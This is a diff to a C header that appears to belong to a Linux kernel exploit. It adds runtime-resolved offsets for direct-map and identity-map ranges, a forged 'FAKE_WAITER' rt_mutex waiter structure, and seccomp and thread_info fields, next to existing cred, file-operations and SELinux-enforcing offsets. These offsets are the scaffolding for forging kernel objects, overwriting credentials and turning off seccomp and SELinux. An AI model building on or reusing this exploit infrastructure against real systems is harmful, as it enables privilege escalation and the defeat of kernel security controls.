@@ -26,6 +26,14 @@ static const struct kernel_offsets *active_offsets = NULL;
 #define P0_PAGE_OFFSET                active_offsets->p0_page_offset
 #define P0_PHYS_OFFSET                active_offsets->p0_phys_offset
 #define P0_KERNEL_PHYS_LOAD           active_offsets->p0_kernel_phys_load
+#undef KERNELSNITCH_IDENTITY_START
+#undef KERNELSNITCH_IDENTITY_END
+#undef DIRECT_MAP_END
+#define KERNELSNITCH_IDENTITY_START   active_offsets->kernelsnitch_identity_start
+#define KERNELSNITCH_IDENTITY_END     active_offsets->kernelsnitch_identity_end
+#define DIRECT_MAP_END                active_offsets->direct_map_end
+#undef DIRECT_MAP_BASE
+#define DIRECT_MAP_BASE               active_offsets->p0_page_offset
 
 /* Struct field offsets */
 #undef TASK_CRED_OFF
@@ -115,6 +123,36 @@ static const struct kernel_offsets *active_offsets = NULL;
 #define FOPS_RELEASE_OFF              active_offsets->fops_release
 #define FOPS_SPLICE_READ_OFF          active_offsets->fops_splice_read
 #define FOPS_SHOW_FDINFO_OFF          active_offsets->fops_show_fdinfo
+
+/* FAKE_WAITER = same struct as WAITER, derive from runtime WAITER values */
+#undef FAKE_WAITER_TREE_PRIO_OFF
+#undef FAKE_WAITER_TREE_DEADLINE_OFF
+#undef FAKE_WAITER_PI_TREE_ENTRY_OFF
+#undef FAKE_WAITER_PI_TREE_PRIO_OFF
+#undef FAKE_WAITER_PI_TREE_DEADLINE_OFF
+#undef FAKE_WAITER_TASK_OFF
+#undef FAKE_WAITER_LOCK_OFF
+#undef FAKE_WAITER_WAKE_STATE_OFF
+#undef FAKE_WAITER_WW_CTX_OFF
+#define FAKE_WAITER_TREE_PRIO_OFF         WAITER_PRIO_OFF
+#define FAKE_WAITER_TREE_DEADLINE_OFF     WAITER_DEADLINE_OFF
+#define FAKE_WAITER_PI_TREE_ENTRY_OFF     WAITER_PI_TREE_ENTRY_OFF
+#define FAKE_WAITER_PI_TREE_PRIO_OFF      (WAITER_PI_TREE_ENTRY_OFF + WAITER_PRIO_OFF)
+#define FAKE_WAITER_PI_TREE_DEADLINE_OFF  (WAITER_PI_TREE_ENTRY_OFF + WAITER_DEADLINE_OFF)
+#define FAKE_WAITER_TASK_OFF              WAITER_TASK_OFF
+#define FAKE_WAITER_LOCK_OFF              WAITER_LOCK_OFF
+#define FAKE_WAITER_WAKE_STATE_OFF        WAITER_WAKE_STATE_OFF
+#define FAKE_WAITER_WW_CTX_OFF            WAITER_WW_CTX_OFF
+
+/* Seccomp/SELinux cred offsets — override for safety */
+#undef SECCOMP_MODE_OFF
+#undef SECCOMP_FILTER_COUNT_OFF
+#undef SECCOMP_FILTER_OFF
+#undef TASK_THREAD_INFO_FLAGS_OFF
+#define SECCOMP_MODE_OFF                  0x00
+#define SECCOMP_FILTER_COUNT_OFF          0x04
+#define SECCOMP_FILTER_OFF                0x08
+#define TASK_THREAD_INFO_FLAGS_OFF        0x00
 
 /* Global symbol offsets */
 #undef SELINUX_ENFORCING_OFF
